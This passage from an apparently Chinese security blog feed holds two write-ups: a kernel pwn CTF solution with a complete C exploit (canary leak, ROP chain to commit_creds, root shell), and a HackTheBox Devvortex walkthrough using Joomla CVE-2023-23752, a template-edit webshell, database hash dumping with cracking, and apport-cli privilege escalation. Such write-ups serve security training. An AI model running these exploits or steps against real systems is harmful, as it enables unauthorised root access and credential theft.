-f</span><br></pre></td></tr></table></figure><p>可以看到insmod了core.ko，而且把内核中所有用到的符号表给复制到了/tmp/kallsyms下面，并且还开了定时关机，我们本地调试的时候，需要把关机给取消了。</p><p>分析程序，发现开了canary和nx：</p><p><img src="https://s2.loli.net/2024/02/11/b9mrln7C2FpKZWE.png" alt=""></p><p>然后ioctl函数类似于一个菜单，有三个分支可进入：</p><p><img src="https://s2.loli.net/2024/02/11/aVASGOgRKNmflTI.png" alt=""></p><p>可以看到core_read中有一个溢出点，其中off的值我们可以在别的分支进行控制：</p><p><img src="https://s2.loli.net/2024/02/11/jtXl6DwEehui4UW.png" alt=""></p><p>core_write有一个大范围的溢出：</p><p><img src="https://s2.loli.net/2024/02/11/G6lzrkC2R8eJuj4.png" alt=""></p><p>core_copy_func这里存在一个整数溢出：</p><p><img src="https://s2.loli.net/2024/02/11/krEsWPVXqZNBb6L.png" alt=""></p><p>思路：</p><ol><li>通过ioctl设置off，然后通过core_read泄露canary</li><li>通过core_write写ROP链</li><li>通过core_copy_func进行栈溢出进行ROP，最终执行<code>commit_creds(prepare_kernel_cred(0))</code></li></ol><p>rop链的构造如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">rop[i++] = commit_creds;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></figure><p>其中具体的偏移可以通过ropper查找。</p><p>exp如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spawn_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">find_symbols</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="comment">/* printf(&quot;vmlinux_base addr: %p\n&quot;, vmlinux_base); */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> <span class="keyword">long</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> <span class="keyword">long</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="comment">// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功提权：</p><p><img src="https://s2.loli.net/2024/02/11/7HlkwnqYKZSmFi4.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> kernel pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>假期打靶第四弹-Devvortex</title>
      <link href="2024/02/07/hackthebox-machine-Devvortex/"/>
      <url>2024/02/07/hackthebox-machine-Devvortex/</url>
      
        <content type="html"><![CDATA[<p>HTB，启动！</p><p>靶机地址：<a href="https://app.hackthebox.com/machines/Devvortex">https://app.hackthebox.com/machines/Devvortex</a></p><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>nmap扫下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-07 10:02 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.242 (10.10.11.242)</span><br><span class="line">Host is up (0.62s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)</span><br><span class="line">|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)</span><br><span class="line">|_  256 18:<span class="built_in">cd</span>:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://devvortex.htb/</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 84.67 seconds</span><br></pre></td></tr></table></figure><p>是台linux机器，开了80端口。是个静态网站啥也没有。</p><p>dirsearch跑了一下，啥也没跑出来，出师不利，卡住了（</p><p>看了下wp，发现是子域名爆破，可以爆破出来dev.devvortex.htb，好吧。</p><p>然后dev.devvortex.htb也是个静态网站，没啥东西，再跑下目录看看，扫出来了robots.txt如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># If the Joomla site is installed within a folder</span><br><span class="line"># eg www.example.com&#x2F;joomla&#x2F; then the robots.txt file</span><br><span class="line"># MUST be moved to the site root</span><br><span class="line"># eg www.example.com&#x2F;robots.txt</span><br><span class="line"># AND the joomla folder name MUST be prefixed to all of the</span><br><span class="line"># paths.</span><br><span class="line"># eg the Disallow rule for the &#x2F;administrator&#x2F; folder MUST</span><br><span class="line"># be changed to read</span><br><span class="line"># Disallow: &#x2F;joomla&#x2F;administrator&#x2F;</span><br><span class="line">#</span><br><span class="line"># For more information about the robots.txt standard, see:</span><br><span class="line"># https:&#x2F;&#x2F;www.robotstxt.org&#x2F;orig.html</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;administrator&#x2F;</span><br><span class="line">Disallow: &#x2F;api&#x2F;</span><br><span class="line">Disallow: &#x2F;bin&#x2F;</span><br><span class="line">Disallow: &#x2F;cache&#x2F;</span><br><span class="line">Disallow: &#x2F;cli&#x2F;</span><br><span class="line">Disallow: &#x2F;components&#x2F;</span><br><span class="line">Disallow: &#x2F;includes&#x2F;</span><br><span class="line">Disallow: &#x2F;installation&#x2F;</span><br><span class="line">Disallow: &#x2F;language&#x2F;</span><br><span class="line">Disallow: &#x2F;layouts&#x2F;</span><br><span class="line">Disallow: &#x2F;libraries&#x2F;</span><br><span class="line">Disallow: &#x2F;logs&#x2F;</span><br><span class="line">Disallow: &#x2F;modules&#x2F;</span><br><span class="line">Disallow: &#x2F;plugins&#x2F;</span><br><span class="line">Disallow: &#x2F;tmp&#x2F;</span><br></pre></td></tr></table></figure><p>然后还扫出来了README，看下README.txt，发现这个站点是个CMS：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Joomla! CMS™</span><br><span class="line"></span><br><span class="line">1- Overview</span><br><span class="line">* This is a Joomla! 4.x installation&#x2F;upgrade package.</span><br><span class="line">* Joomla! Official site: https:&#x2F;&#x2F;www.joomla.org</span><br><span class="line">* Joomla! 4.2 version history - https:&#x2F;&#x2F;docs.joomla.org&#x2F;Special:MyLanguage&#x2F;Joomla_4.2_version_history</span><br><span class="line">* Detailed changes in the Changelog: https:&#x2F;&#x2F;github.com&#x2F;joomla&#x2F;joomla-cms&#x2F;commits&#x2F;4.2-dev</span><br><span class="line"></span><br><span class="line">2- What is Joomla?</span><br><span class="line">* Joomla! is a Content Management System (CMS) which enables you to build websites and powerful online applications.</span><br><span class="line">* It&#39;s a free and Open Source software, distributed under the GNU General Public License version 2 or later.</span><br><span class="line">* This is a simple and powerful web server application and it requires a server with PHP and either MySQL, PostgreSQL or SQL Server to run.</span><br><span class="line">You can find full technical requirements here: https:&#x2F;&#x2F;downloads.joomla.org&#x2F;technical-requirements.</span><br><span class="line"></span><br><span class="line">3- Is Joomla! for you?</span><br><span class="line">* Joomla! is the right solution for most content web projects: https:&#x2F;&#x2F;docs.joomla.org&#x2F;Special:MyLanguage&#x2F;Portal:Learn_More</span><br><span class="line">* See Joomla&#39;s core features - https:&#x2F;&#x2F;www.joomla.org&#x2F;core-features.html</span><br><span class="line">* Try out our free hosting service: https:&#x2F;&#x2F;launch.joomla.org</span><br><span class="line"></span><br><span class="line">4- How to find a Joomla! translation?</span><br><span class="line">* Repository of accredited language packs: https:&#x2F;&#x2F;downloads.joomla.org&#x2F;language-packs</span><br><span class="line">* You can also add languages directly to your website via your Joomla! administration panel: https:&#x2F;&#x2F;docs.joomla.org&#x2F;Special:MyLanguage&#x2F;J4.x:Setup_a_Multilingual_Site&#x2F;Installing_New_Language</span><br><span class="line">* Learn how to setup a Multilingual Joomla! Site: https:&#x2F;&#x2F;docs.joomla.org&#x2F;Special:MyLanguage&#x2F;J4.x:Setup_a_Multilingual_Site</span><br><span class="line"></span><br><span class="line">5- Learn Joomla!</span><br><span class="line">* Read Getting Started with Joomla to find out the basics: https:&#x2F;&#x2F;docs.joomla.org&#x2F;Special:MyLanguage&#x2F;J4.x:Getting_Started_with_Joomla!</span><br><span class="line">* Before installing, read the beginners guide: https:&#x2F;&#x2F;docs.joomla.org&#x2F;Special:MyLanguage&#x2F;Portal:Beginners</span><br><span class="line"></span><br><span class="line">6- What are the benefits of Joomla?</span><br><span class="line">* The functionality of a Joomla! website can be extended by installing extensions that you can create (or download) to suit your needs.</span><br><span class="line">* There are many ready-made extensions that you can download and install.</span><br><span class="line">* Check out the Joomla! Extensions Directory (JED): https:&#x2F;&#x2F;extensions.joomla.org</span><br><span class="line"></span><br><span class="line">7- Is it easy to change the layout display?</span><br><span class="line">* The layout is controlled by templates that you can edit.</span><br><span class="line">* There are a lot of ready-made professional templates that you can download.</span><br><span class="line">* Check out the template management information: https:&#x2F;&#x2F;docs.joomla.org&#x2F;Special:MyLanguage&#x2F;Portal:Template_Management</span><br><span class="line"></span><br><span class="line">8- Ready to install Joomla?</span><br><span class="line">* Check the minimum requirements here: https:&#x2F;&#x2F;downloads.joomla.org&#x2F;technical-requirements</span><br><span class="line">* How do you install Joomla - https:&#x2F;&#x2F;docs.joomla.org&#x2F;Special:MyLanguage&#x2F;J4.x:Installing_Joomla</span><br><span class="line">* You could start your Joomla! experience building your site on a local test server.</span><br><span class="line">When ready it can be moved to an online hosting account of your choice.</span><br><span class="line">See the tutorial: https:&#x2F;&#x2F;docs.joomla.org&#x2F;Special:MyLanguage&#x2F;Installing_Joomla_locally</span><br><span class="line"></span><br><span class="line">9- Updates are free!</span><br><span class="line">* Always use the latest version: https:&#x2F;&#x2F;downloads.joomla.org&#x2F;latest</span><br><span class="line"></span><br><span class="line">10- Where can you get support and help?</span><br><span class="line">* The Joomla! Documentation: https:&#x2F;&#x2F;docs.joomla.org&#x2F;Special:MyLanguage&#x2F;Main_Page</span><br><span class="line">* FAQ Frequently Asked Questions: https:&#x2F;&#x2F;docs.joomla.org&#x2F;Special:MyLanguage&#x2F;Category:FAQ</span><br><span class="line">* Find the information you need: https:&#x2F;&#x2F;docs.joomla.org&#x2F;Special:MyLanguage&#x2F;Start_here</span><br><span class="line">* Find help and other users: https:&#x2F;&#x2F;www.joomla.org&#x2F;about-joomla&#x2F;create-and-share.html</span><br><span class="line">* Post questions at our forums: https:&#x2F;&#x2F;forum.joomla.org</span><br><span class="line">* Joomla! Resources Directory (JRD): https:&#x2F;&#x2F;community.joomla.org&#x2F;service-providers-directory&#x2F;</span><br><span class="line"></span><br><span class="line">11- Do you already have a Joomla! site that&#39;s not built with Joomla! 4.x ?</span><br><span class="line">* What&#39;s new in Joomla! 4.x: https:&#x2F;&#x2F;www.joomla.org&#x2F;4</span><br><span class="line">* What are the main differences between 3.x and 4.x? https:&#x2F;&#x2F;docs.joomla.org&#x2F;Special:MyLanguage&#x2F;What_are_the_major_differences_between_Joomla!_3.x_and_4.x</span><br><span class="line">* How to migrate from 3.x to 4.x? Tutorial: https:&#x2F;&#x2F;docs.joomla.org&#x2F;Special:MyLanguage&#x2F;Joomla_3.x_to_4.x_Step_by_Step_Migration</span><br><span class="line">* How to migrate from 2.5.x to 3.x? Tutorial: https:&#x2F;&#x2F;docs.joomla.org&#x2F;Special:MyLanguage&#x2F;Joomla_2.5_to_3.x_Step_by_Step_Migration</span><br><span class="line">* How to migrate from 1.5.x to 3.x? Tutorial: https:&#x2F;&#x2F;docs.joomla.org&#x2F;Special:MyLanguage&#x2F;Joomla_1.5_to_3.x_Step_by_Step_Migration</span><br><span class="line"></span><br><span class="line">12- Do you want to improve Joomla?</span><br><span class="line">* Where to request a feature? https:&#x2F;&#x2F;issues.joomla.org</span><br><span class="line">* How do you report a bug? https:&#x2F;&#x2F;docs.joomla.org&#x2F;Special:MyLanguage&#x2F;Filing_bugs_and_issues</span><br><span class="line">* Get Involved: Joomla! is a community developed software. Join the community at https:&#x2F;&#x2F;volunteers.joomla.org</span><br><span class="line">* Documentation for Developers: https:&#x2F;&#x2F;docs.joomla.org&#x2F;Special:MyLanguage&#x2F;Portal:Developers</span><br><span class="line">* Documentation for Web designers: https:&#x2F;&#x2F;docs.joomla.org&#x2F;Special:MyLanguage&#x2F;Web_designers</span><br><span class="line"></span><br><span class="line">Copyright:</span><br><span class="line">* (C) 2005 Open Source Matters, Inc. &lt;https:&#x2F;&#x2F;www.joomla.org&gt;</span><br><span class="line">* Distributed under the GNU General Public License version 2 or later</span><br><span class="line">* See License details at https:&#x2F;&#x2F;docs.joomla.org&#x2F;Special:MyLanguage&#x2F;Joomla_Licenses</span><br></pre></td></tr></table></figure><p>搜了下相关漏洞，发现一个CVE-2023-23752，是未授权访问漏洞，但是看起来好像执行不了啥命令：</p><p><img src="https://s2.loli.net/2024/02/07/VG4sLXDFdO3k5bn.png" alt=""></p><p>但是有用户名、密码、数据库等敏感信息。</p><p>尝试ssh连接但是失败了，然后突然想到robots里面把目录都给列出来了，尝试找下后台，然后登陆：</p><p><img src="https://s2.loli.net/2024/02/07/BUnw3jDNEaT2K6p.png" alt=""></p><p>登进后台之后就很容易拿shell了，常见进后台的操作就是找文件上传点 / 插件加载点 / 模板加载点 之类的常见功能，然后找到一个管理员的模板管理：</p><p><img src="https://s2.loli.net/2024/02/07/NcwpmDVyZoTO2MX.png" alt=""></p><p>这个地方看起来可以改具体页面的php代码从而执行命令，测试一下把error.php改成phpinfo：</p><p><img src="https://s2.loli.net/2024/02/07/I5o9qRNjtQZAMza.png" alt=""></p><p>有戏，那直接上个🐴，然后蚁剑连：</p><p><img src="https://s2.loli.net/2024/02/07/dXuJNLsifaEyTrh.png" alt=""></p><p>这么简单就拿到了shell和web站点的adminstrator，最 好 搅 屎 的 一 集。</p><p>当前是www-data用户，没有访问用户flag的权限，还是老样子，得想办法搞到ssh的密码：</p><p><img src="https://s2.loli.net/2024/02/07/3mIKGx5nQHXOFdi.png" alt=""></p><p>登进mysql一顿乱搜，这里用蚁剑不行，需要再弹个shell出来：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select username,password from sd4fg_users;</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| username | password                                                     |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |</span><br><span class="line">| logan    | $2y$10$IT4k5kmSGvHSO9d6M&#x2F;1w0eYiB5Ne9XzArQRFJTGThNiy&#x2F;yBtkIj12 |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>hashcat跑一下：</p><p><img src="https://s2.loli.net/2024/02/07/4pIlsg9AvT21dtJ.png" alt=""></p><p>拿到密码后ssh登录，可以拿到user flag：</p><p><img src="https://s2.loli.net/2024/02/07/Hj1iP59TxJ2oshd.png" alt=""></p><h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><p>查看特权指令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">logan@devvortex:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> logan:</span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password <span class="keyword">for</span> logan:</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> logan on devvortex:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User logan may run the following commands on devvortex:</span><br><span class="line">    (ALL : ALL) /usr/bin/apport-cli</span><br></pre></td></tr></table></figure><p>搜下这个apport-cli是啥东西，发现好像是个crash分析工具，然后找到了这个：<a href="https://github.com/diego-tella/CVE-2023-1326-PoC">https://github.com/diego-tella/CVE-2023-1326-PoC</a></p><p>首先先在本地创建一份crash文件，然后起个http server，用目标机器下载crash文件，随后加载文件，进入View report便可以成功提权：</p><p><img src="https://s2.loli.net/2024/02/07/y1tKwx4o8TpsmqZ.png" alt=""></p><p>成功提权：</p><p><img src="https://s2.loli.net/2024/02/07/Nnx7eWtbYhjuZaD.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> Linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>假期打靶第三弹-Analytics</title>
      <link href="2024/02/06/hackthebox-machine-Analytics/"/>
      <url>2024/02/06/hackthebox-machine-Analytics/</url>
      
